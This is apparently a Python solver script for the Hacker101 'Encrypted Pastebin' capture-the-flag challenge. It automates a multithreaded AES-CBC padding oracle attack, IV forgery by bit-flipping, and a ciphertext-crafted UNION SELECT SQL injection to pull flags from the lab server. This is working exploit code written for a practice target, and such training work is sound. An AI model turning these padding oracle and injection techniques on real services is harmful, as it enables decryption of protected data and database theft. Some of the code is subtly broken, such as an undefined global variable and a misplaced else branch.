# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag, findall as findall_flags
from base64 import b64decode as decode_base64, b64encode as encode_base64
from pwn import xor                           # XOR operation utility
from tqdm import trange                       # Progress bar for loops
from base64 import b64decode, b64encode       # Standard Base64 functions
from queue import Queue
from threading import Thread

# Getting CTF URL # 
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []

# Custom base64 decode used by challenge server (URL-safe variant)
def custom_decode(x):
    return b64decode(x.replace(b'~', b'=').replace(b'!', b'/').replace(b'-', b'+'))

# Custom base64 encode used by challenge server (URL-safe variant)
def custom_encode(x):
    return b64encode(x).replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')

# PKCS#7 padding for AES block alignment (16-byte block size)
def pad(x):
    pad_len = 16 - len(x) % 16
    return x + bytes([pad_len] * pad_len)

# Padding oracle query: returns True if padding is valid (i.e., no padding error)
def oracle(x):
    resp = get_request(url + custom_encode(x).decode())
    return 'Incorrect padding' not in resp.text and 'PaddingException' not in resp.text

# Worker function to try byte values in a given range, appends correct guess to `result`
def find_byte_range(x, suf, i, start, end, result):
    for j in range(start, end):
        padding = bytes([i ^ (i - 1)] * (i - 1))     # Adjust suffix for correct padding
        cur_suf = b'\x01' * (16 - i) + bytes([j]) + xor(suf, padding)
        if oracle(cur_suf + x):                      # Valid padding found
            result.append(j)
            break

# Core function to brute-force one 16-byte block using padding oracle
def brute_init(x):
    cur, suf = b'', b''
    for i in trange(1, 17):                          # Byte-by-byte decryption
        threads, result = [], []
        step = 4                                     # 64 threads * 4 values = 256
        for t in range(64):
            start, end = t * step, (t + 1) * step if t != 63 else 256
            thread = Thread(target=find_byte_range, args=(x, suf, i, start, end, result))
            threads.append(thread)
            thread.start()
        for thread in threads: thread.join()
        if result:
            j = result[0]
            padding = bytes([i ^ (i - 1)] * (i - 1))
            cur_suf = b'\x01' * (16 - i) + bytes([j]) + xor(suf, padding)
            suf = cur_suf[16 - i:]
            cur = xor(bytes([i]), suf[0:1]) + cur    # Recover plaintext byte
    return cur

class BlockDecryptor(Thread):
    def __init__(self, block_index, prev_ct, cur_ct, output_queue):
        Thread.__init__(self)  # Initialize the thread
        self.block_index = block_index  # Index of the block being decrypted
        self.prev_ct = prev_ct          # The previous ciphertext block (used for XOR)
        self.cur_ct = cur_ct            # The current ciphertext block being decrypted
        self.output_queue = output_queue  # Queue to store the result for multithreaded collection
        # Oracle function: returns True if the padding is valid (i.e., no padding error in response)
        self.oracle = lambda c: "padding" not in get_request(f"{ctf_url}/?post={c}", headers = {"User-Agent": "Mozilla/5.0"}).text.lower()

    def run(self):
        print(f"\033[32m    [*] Starting decryption of block {self.block_index}\033[0m")
        intermediate = bytearray(16)     # Stores intermediate decrypted values (after XOR with padding)
        plaintext_block = bytearray(16)  # Stores the final decrypted plaintext block
        modified_block = bytearray(16)   # This will be manipulated for each guess attempt

        # Loop over each byte in the block from last to first
        for padding_length in range(1, 16 + 1):
            byte_pos = 16 - padding_length  # Current byte position being guessed
            print(f"\033[32m[+] Block {self.block_index} - guessing byte {byte_pos} (padding {padding_length})\033[0m")

            # Set known padding bytes for previously solved positions
            for i in range(1, padding_length):
                modified_block[-i] = intermediate[-i] ^ padding_length  # Ensure proper padding format

            found = False  # Flag to track if a correct guess is found

            # Brute-force all possible byte values (0-255) at current position
            for guess in range(256):
                modified_block[-padding_length] = guess  # Set the guess at the target position
                # Concatenate the modified block with the target ciphertext block
                crafted_cipher = bytes(modified_block) + self.cur_ct
                # Encode the crafted ciphertext in modified base64 format
                crafted_cipher_b64 = encode_base64(crafted_cipher).decode().replace('=', '~').replace('/', '!').replace('+', '-')
                # Submit to oracle to check if the padding is valid
                if self.oracle(crafted_cipher_b64):
                    # If valid, compute the intermediate value
                    intermediate[-padding_length] = guess ^ padding_length
                    # Recover the plaintext byte using XOR with corresponding prev_ct byte
                    plaintext_block[-padding_length] = intermediate[-padding_length] ^ self.prev_ct[-padding_length]
                    print(f"\033[32m[*] Block {self.block_index} byte {byte_pos} decrypted: {plaintext_block[-padding_length]:02x}\033[0m")
                    found = True
                    break  # Stop guessing after correct byte is found
            if not found:
                print(f"\033[32m[!] Block {self.block_index} byte {byte_pos} failed to decrypt!\033[0m")
                # Could raise an error or continue to try remaining bytes (depending on strategy)
        # Decryption of this block complete; print and store result
        print(f"\033[32m[*] Finished decrypting block {self.block_index}: {plaintext_block.hex()}\033[0m")
        self.output_queue.put((self.block_index, bytes(plaintext_block)))  # Push the result to the output queue


# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags. This might take 30-60minutes or more.\033[0m")
        # Send a POST request to create a new encrypted paste and extract the encrypted token from the URL
        encypted_token = post_request(ctf_url, data = {"title": "Skillshetra", "body": "Skillshetra in python"}).url.replace(f'{ctf_url}/?post=', '')
        # Try to fetch the flag directly by modifying the encrypted token (removing last 2 characters)
        # and searching for the flag pattern in the resulting decrypted page
        #############################################################################################################
        ############################## Finding First flag by changing the value of post #############################
        #############################################################################################################
        print("\033[32m Got the first flag.... \033[0m")
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/?post={encypted_token[:-2]}").text).group(1)}$FLAG$')

        #############################################################################################################
        ############################## Finding Second flag using padding oracle attack ##############################
        #############################################################################################################
        # Decode the base64-like encoded encrypted token back into raw bytes (ciphertext)
        cipher_text = decode_base64(encypted_token.replace('~', '=').replace('!', '/').replace('-', '+'))
        # Split the ciphertext into 16-byte blocks for block-wise decryption (AES block size is 16 bytes)
        blocks = [cipher_text[i:i+16] for i in range(0, len(cipher_text), 16)]
        # Count the number of blocks in the ciphertext (including the IV block at index 0)
        num_blocks = len(blocks)
        # Initialize a thread-safe queue to collect decrypted blocks from each thread
        output_queue = Queue()
        # Store references to thread objects for joining later
        threads = []
        # Print how many blocks will be decrypted (excluding the IV block)
        print(f"\033[31m[*] Starting parallel decryption of {num_blocks - 1} blocks\033[0m")
        # Launch a thread for each block (starting from block 1) to decrypt in parallel using padding oracle
        for i in range(1, num_blocks):
            t = BlockDecryptor(i, blocks[i-1], blocks[i], output_queue)  # Each thread gets previous and current ciphertext block
            t.start()   # Start the thread
            threads.append(t)  # Add thread to list for later joining
        # Wait for all threads to finish
        for t in threads:
            t.join()
        # Initialize a list to store decrypted blocks in the correct order
        decrypted_blocks = [None] * (num_blocks - 1)
        # Retrieve all decrypted blocks from the output queue
        while not output_queue.empty():
            idx, block = output_queue.get()
            decrypted_blocks[idx - 1] = block  # Store the decrypted block at the correct index
        # Join all decrypted blocks into one byte string (the full plaintext)
        decrypted = b"".join(decrypted_blocks)
        # Remove PKCS#7 padding using the last byte (value indicates number of padding bytes)
        decrypted = decrypted[:-decrypted[-1]].decode('utf-8', errors='ignore')  # Decode to UTF-8 text
        # Extract the flag from the fully decrypted plaintext using regex
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", decrypted).group(1)}$FLAG$')
        print("\033[32m Got the second flag.... \033[0m")

        #############################################################################################################
        ############################################## Finding Third flag by IDOR ###################################
        #############################################################################################################
        # Define a lambda function to XOR two byte strings byte-by-byte
        bxor = lambda b1, b2: bytes([x ^ y for x, y in zip(b1, b2)])
        # Decode the encrypted token and extract ciphertext starting from block 7 (after IV + 5 blocks)
        # This is the encrypted data that will be decrypted using our crafted IV
        data = decode_base64(encypted_token.replace('~', '=').replace('!', '/').replace('-', '+'))[16*(1+5):]
        # Extract block 6 (used as IV for decrypting block 7)
        iv_6 = decode_base64(encypted_token.replace('~', '=').replace('!', '/').replace('-', '+'))[16*(1+4):16*(1+5)]
        # XOR the known plaintext b'$FLAG$", "id": "' with iv_6 to get the intermediate value (plaintext ^ IV = intermediate)
        immediate = bxor(b'$FLAG$", "id": "', iv_6)
        # XOR the intermediate value with the desired plaintext '{"id":"1", "i":"' to forge a new IV that will
        # decrypt to this plaintext when used with the same ciphertext
        iv = bxor(immediate, b'{"id":"1", "i":"')
        # Send a GET request using the new IV + original ciphertext, and convert result into URL-safe base64
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/?post={encode_base64(iv+data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')}").text).group(1)}$FLAG$')
        print("\033[32m Got the third flag.... \033[0m")

        #############################################################################################################
        ###################################### Finding Fourth flag by SQL Injection #################################
        #############################################################################################################

        # Target CTF URL and encrypted post param
        url = f'{ctf_url}/?post='
        cur_param = encypted_token.encode()
        cur_param = custom_decode(cur_param)

        # Known block setup (decrypted C1 block = P1, to later be used in XOR with crafted plaintext)
        last = cur_param[16:32]
        known = xor(cur_param[:16], b'{"flag": "^FLAG^')

        # Desired plaintext block we want to inject via bit-flipping
        wanted = pad(b'{"id":"7 UNION SELECT group_concat(headers), 1 FROM tracking"}')

        # Start from known C2 (last), prepend crafted blocks by brute-forcing each one backwards
        payload = last
        for i in range(len(wanted), 16, -16):
            payload = xor(known[:16], wanted[i-16:i]) + payload
            known = brute_init(payload[:16]) + known
        # Encode the crafted payload using the custom base64 variant
        payload_encoded = custom_encode(xor(known[:16], wanted[:16]) + payload)
        # Send request with the encoded payload
        response = get_request(f"{ctf_url}/?post={payload_encoded.decode()}").text
        # Extract the modified 'post' parameter safely
        match = search_flag(r'post=([a-zA-Z0-9\-\_\!\~]+)', response)
        if match:
            payload_final = match.group(1)
        else:
            raise ValueError("Could not find modified 'post' parameter in server response. Check payload.")
        # Fetch all flags from the server response using the final payload
        response_final = get_request(f"{ctf_url}/?post={payload_final}").text
        for flag in findall_flags(r"\^FLAG\^(.*?)\$FLAG\$", response_final):
            if flag not in FLAGS:
                FLAGS.append(f'^FLAG^{flag}$FLAG$')
                print(f"\033[32m[*] Found fourth flag: {flag}\033[0m")
        else:
            print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")
